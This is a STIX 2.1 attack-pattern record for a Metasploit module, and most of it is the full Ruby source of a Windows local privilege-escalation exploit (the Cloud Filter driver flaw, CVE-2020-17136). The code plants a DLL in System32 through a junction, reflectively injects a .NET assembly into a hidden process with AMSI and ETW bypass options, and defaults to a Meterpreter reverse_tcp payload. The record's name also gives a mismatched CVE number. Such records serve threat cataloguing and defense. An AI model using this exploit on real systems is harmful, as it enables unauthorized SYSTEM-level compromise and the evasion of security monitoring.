{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--87ae28d6-4759-4fb6-a1a1-c2c2d1d398fb",
    "created": "2024-08-14T16:50:12.944178Z",
    "modified": "2024-08-14T16:50:12.944183Z",
    "name": "CVE-2020-1170 Cloud Filter Arbitrary File Creation EOP",
    "description": " The Cloud Filter driver, cldflt.sys, on Windows 10 v1803 and later, prior to the December 2020 updates, did not set the IO_FORCE_ACCESS_CHECK or OBJ_FORCE_ACCESS_CHECK flags when calling FltCreateFileEx() and FltCreateFileEx2() within its HsmpOpCreatePlaceholders() function with attacker controlled input. This meant that files were created with KernelMode permissions, thereby bypassing any security checks that would otherwise prevent a normal user from being able to create files in directories they don't have permissions to create files in.  This module abuses this vulnerability to perform a DLL hijacking attack against the Microsoft Storage Spaces SMP service, which grants the attacker code execution as the NETWORK SERVICE user. Users are strongly encouraged to set the PAYLOAD option to one of the Meterpreter payloads, as doing so will allow them to subsequently escalate their new session from NETWORK SERVICE to SYSTEM by using Meterpreter's \"getsystem\" command to perform RPCSS Named Pipe Impersonation and impersonate the SYSTEM user.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/cve_2020_17136.rb",
            "external_id": "cve_2020_17136.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-17136"
        },
        {
            "source_name": "reference",
            "url": "https://bugs.chromium.org/p/project-zero/issues/detail?id=2082"
        },
        {
            "source_name": "reference",
            "url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-17136"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  include Exploit::EXE\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Version\n  include Msf::Post::Windows::Process\n  include Msf::Post::Windows::ReflectiveDLLInjection\n  include Msf::Post::Windows::Dotnet\n  include Msf::Post::Windows::Services\n  include Msf::Post::Windows::FileSystem\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'CVE-2020-1170 Cloud Filter Arbitrary File Creation EOP',\n        'Description' => %q{\n          The Cloud Filter driver, cldflt.sys, on Windows 10 v1803 and later, prior to the December\n          2020 updates, did not set the IO_FORCE_ACCESS_CHECK or OBJ_FORCE_ACCESS_CHECK flags when\n          calling FltCreateFileEx() and FltCreateFileEx2() within its HsmpOpCreatePlaceholders()\n          function with attacker controlled input. This meant that files were created with\n          KernelMode permissions, thereby bypassing any security checks that would otherwise\n          prevent a normal user from being able to create files in directories\n          they don't have permissions to create files in.\n\n          This module abuses this vulnerability to perform a DLL hijacking attack against the\n          Microsoft Storage Spaces SMP service, which grants the attacker code execution as the\n          NETWORK SERVICE user. Users are strongly encouraged to set the PAYLOAD option to one\n          of the Meterpreter payloads, as doing so will allow them to subsequently escalate their\n          new session from NETWORK SERVICE to SYSTEM by using Meterpreter's \"getsystem\" command\n          to perform RPCSS Named Pipe Impersonation and impersonate the SYSTEM user.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'James Foreshaw', # Vulnerability discovery and PoC creator\n          'Grant Willcox' # Metasploit module\n        ],\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Privileged' => true,\n        'Arch' => [ARCH_X64],\n        'Targets' => [\n          [ 'Windows DLL Dropper', { 'Arch' => [ARCH_X64], 'Type' => :windows_dropper } ],\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2020-03-10',\n        'References' => [\n          ['CVE', '2020-17136'],\n          ['URL', 'https://bugs.chromium.org/p/project-zero/issues/detail?id=2082'],\n          ['URL', 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-17136']\n        ],\n        'Notes' => {\n          'SideEffects' => [ ARTIFACTS_ON_DISK ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability' => [ CRASH_SAFE ]\n        },\n        'DefaultOptions' => {\n          'EXITFUNC' => 'process',\n          'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_process_attach\n              stdapi_sys_process_execute\n              stdapi_sys_process_get_processes\n              stdapi_sys_process_getpid\n              stdapi_sys_process_kill\n              stdapi_sys_process_memory_allocate\n              stdapi_sys_process_memory_write\n              stdapi_sys_process_thread_create\n            ]\n          }\n        }\n      )\n    )\n    register_options(\n      [\n        OptBool.new('AMSIBYPASS', [true, 'Enable Amsi bypass', true]),\n        OptBool.new('ETWBYPASS', [true, 'Enable Etw bypass', true]),\n        OptInt.new('WAIT', [false, 'Time in seconds to wait', 5])\n      ], self.class\n    )\n\n    register_advanced_options(\n      [\n        OptBool.new('KILL', [true, 'Kill the injected process at the end of the task', false])\n      ]\n    )\n  end\n\n  def check_requirements(clr_req, installed_dotnet_versions)\n    installed_dotnet_versions.each do |fi|\n      if clr_req == 'v4.0.30319'\n        if fi[0] == '4'\n          vprint_status('Requirements ok')\n          return true\n        end\n      elsif fi[0] == '3'\n        vprint_status('Requirements ok')\n        return true\n      end\n    end\n    print_error('Required dotnet version not present')\n    false\n  end\n\n  def check\n    if session.platform != 'windows'\n      # Non-Windows systems are definitely not affected.\n      return CheckCode::Safe('Target is not a Windows system, so it is not affected by this vulnerability!')\n    end\n\n    version = get_version_info\n\n    # Build numbers taken from https://www.qualys.com/research/security-alerts/2020-03-10/microsoft/\n    if version.build_number == Msf::WindowsVersion::Win10_20H2 && version.build_number.revision_number.between?(0, 684)\n      return CheckCode::Appears('A vulnerable Windows 10 20H2 build was detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_2004 && version.build_number.revision_number.between?(0, 684)\n      return CheckCode::Appears('A vulnerable Windows 10 20H1 build was detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_1909 && version.build_number.revision_number.between?(0, 1255)\n      return CheckCode::Appears('A vulnerable Windows 10 v1909 build was detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_1903 && version.build_number.revision_number.between?(0, 1255)\n      return CheckCode::Appears('A vulnerable Windows 10 v1903 build was detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_1809 && version.build_number.revision_number.between?(0, 1636)\n      return CheckCode::Appears('A vulnerable Windows 10 v1809 build was detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_1803 && version.build_number.revision_number.between?(0, 1901)\n      return CheckCode::Appears('A vulnerable Windows 10 v1803 build was detected!')\n    else\n      return CheckCode::Safe('The build number of the target machine does not appear to be a vulnerable version!')\n    end\n  end\n\n  def exploit\n    if sysinfo['Architecture'] != ARCH_X64\n      fail_with(Failure::NoTarget, 'This module currently only supports targeting x64 systems!')\n    elsif session.arch != ARCH_X64\n      fail_with(Failure::NoTarget, 'Sorry, WOW64 is not supported at this time!')\n    end\n    dir_junct_path = 'C:\\\\Windows\\\\Temp'\n    intermediate_dir = rand_text_alpha(10).to_s\n    junction_dir = rand_text_alpha(10).to_s\n    path_to_intermediate_dir = \"#{dir_junct_path}\\\\#{intermediate_dir}\"\n\n    mkdir(path_to_intermediate_dir.to_s)\n    if !directory?(path_to_intermediate_dir.to_s)\n      fail_with(Failure::UnexpectedReply, 'Could not create the intermediate directory!')\n    end\n    register_dir_for_cleanup(path_to_intermediate_dir.to_s)\n\n    mkdir(\"#{path_to_intermediate_dir}\\\\#{junction_dir}\")\n    if !directory?(\"#{path_to_intermediate_dir}\\\\#{junction_dir}\")\n      fail_with(Failure::UnexpectedReply, 'Could not create the junction directory as a folder!')\n    end\n\n    mount_handle = create_mount_point(\"#{path_to_intermediate_dir}\\\\#{junction_dir}\", 'C:\\\\')\n    if !directory?(\"#{path_to_intermediate_dir}\\\\#{junction_dir}\")\n      fail_with(Failure::UnexpectedReply, 'Could not transform the junction directory into a junction!')\n    end\n\n    exe_path = ::File.expand_path(::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2020-17136', 'cloudFilterEOP.exe'))\n    unless File.file?(exe_path)\n      fail_with(Failure::BadConfig, 'Assembly not found')\n    end\n    installed_dotnet_versions = get_dotnet_versions\n    vprint_status(\"Dot Net Versions installed on target: #{installed_dotnet_versions}\")\n    if installed_dotnet_versions == []\n      fail_with(Failure::BadConfig, 'Target has no .NET framework installed')\n    end\n    if check_requirements('v4.0.30319', installed_dotnet_versions) == false\n      fail_with(Failure::BadConfig, 'CLR required for assembly not installed')\n    end\n    payload_path = \"C:\\\\Windows\\\\Temp\\\\#{rand_text_alpha(16)}.dll\"\n    print_status(\"Dropping payload dll at #{payload_path} and registering it for cleanup...\")\n    write_file(payload_path, generate_payload_dll)\n    register_file_for_cleanup(payload_path)\n    execute_assembly(exe_path, \"#{path_to_intermediate_dir} #{junction_dir}\\\\Windows\\\\System32\\\\healthapi.dll #{payload_path}\")\n    service_start('smphost')\n    register_file_for_cleanup('C:\\\\Windows\\\\System32\\\\healthapi.dll')\n    sleep(3)\n    delete_mount_point(\"#{path_to_intermediate_dir}\\\\#{junction_dir}\", mount_handle)\n  end\n\n  def pid_exists(pid)\n    mypid = client.sys.process.getpid.to_i\n\n    if pid == mypid\n      print_bad('Cannot select the current process as the injection target')\n      return false\n    end\n\n    host_processes = client.sys.process.get_processes\n    if host_processes.empty?\n      print_bad('No running processes found on the target host.')\n      return false\n    end\n\n    theprocess = host_processes.find { |x| x['pid'] == pid }\n\n    !theprocess.nil?\n  end\n\n  def launch_process\n    process_name = 'notepad.exe'\n    print_status(\"Launching #{process_name} to host CLR...\")\n\n    process = client.sys.process.execute(process_name, nil, {\n      'Channelized' => true,\n      'Hidden' => true,\n      'UseThreadToken' => true,\n      'ParentPid' => 0\n    })\n    hprocess = client.sys.process.open(process.pid, PROCESS_ALL_ACCESS)\n    print_good(\"Process #{hprocess.pid} launched.\")\n    [process, hprocess]\n  end\n\n  def inject_hostclr_dll(process)\n    print_status(\"Reflectively injecting the Host DLL into #{process.pid}..\")\n\n    library_path = ::File.join(Msf::Config.data_directory, 'post', 'execute-dotnet-assembly', 'HostingCLRx64.dll')\n    library_path = ::File.expand_path(library_path)\n\n    print_status(\"Injecting Host into #{process.pid}...\")\n    exploit_mem, offset = inject_dll_into_process(process, library_path)\n    [exploit_mem, offset]\n  end\n\n  def execute_assembly(exe_path, exe_args)\n    if sysinfo.nil?\n      fail_with(Failure::BadConfig, 'Session invalid')\n    else\n      print_status(\"Running module against #{sysinfo['Computer']}\")\n    end\n    if datastore['WAIT'].zero?\n      print_warning('Output unavailable as wait time is 0')\n    end\n\n    process, hprocess = launch_process\n    exploit_mem, offset = inject_hostclr_dll(hprocess)\n\n    assembly_mem = copy_assembly(exe_path, hprocess, exe_args)\n\n    print_status('Executing...')\n    hprocess.thread.create(exploit_mem + offset, assembly_mem)\n\n    if datastore['WAIT'].positive?\n      sleep(datastore['WAIT'])\n      read_output(process)\n    end\n\n    if datastore['KILL']\n      print_good(\"Killing process #{hprocess.pid}\")\n      client.sys.process.kill(hprocess.pid)\n    end\n\n    print_good('Execution finished.')\n  end\n\n  def copy_assembly(exe_path, process, exe_args)\n    print_status(\"Host injected. Copy assembly into #{process.pid}...\")\n    int_param_size = 8\n    sign_flag_size = 1\n    amsi_flag_size = 1\n    etw_flag_size = 1\n    assembly_size = File.size(exe_path)\n\n    cln_params = ''\n    cln_params << exe_args\n    cln_params << \"\\x00\"\n\n    payload_size = amsi_flag_size + etw_flag_size + sign_flag_size + int_param_size\n    payload_size += assembly_size + cln_params.length\n    assembly_mem = process.memory.allocate(payload_size, PAGE_READWRITE)\n    params = [\n      assembly_size,\n      cln_params.length,\n      datastore['AMSIBYPASS'] ? 1 : 0,\n      datastore['ETWBYPASS'] ? 1 : 0,\n      2\n    ].pack('IICCC')\n    params += cln_params\n\n    process.memory.write(assembly_mem, params + File.read(exe_path, mode: 'rb'))\n    print_status('Assembly copied.')\n    assembly_mem\n  end\n\n  def read_output(process)\n    print_status('Start reading output')\n    old_timeout = client.response_timeout\n    client.response_timeout = 5\n\n    begin\n      loop do\n        output = process.channel.read\n        if !output.nil? && !output.empty?\n          output.split(\"\\n\").each { |x| print_good(x) }\n        end\n        break if output.nil? || output.empty?\n      end\n    rescue Rex::TimeoutError\n      vprint_warning('Time out exception: wait limit exceeded (5 sec)')\n    rescue ::StandardError => e\n      print_error(\"Exception: #{e.inspect}\")\n    end\n\n    client.response_timeout = old_timeout\n    print_status('End output.')\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-03-10",
    "x_mitre_platforms": [
        "['win']"
    ]
}